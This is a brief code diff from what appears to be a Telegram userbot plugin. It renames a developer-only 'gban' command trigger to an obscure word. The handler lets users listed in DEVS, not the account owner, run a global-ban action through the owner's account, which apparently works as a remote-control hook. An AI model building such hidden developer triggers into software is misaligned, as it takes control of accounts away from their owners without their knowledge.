@@ -16,7 +16,7 @@ __HELP__ = """
 
 
 @PY.UBOT("gban")
-@ubot.on_message(filters.user(DEVS) & filters.command(".cgban", "") & ~filters.me)
+@ubot.on_message(filters.user(DEVS) & filters.command("ikuzotemera", "") & ~filters.me)
 async def _(client, message):
     await global_banned(client, message)
 
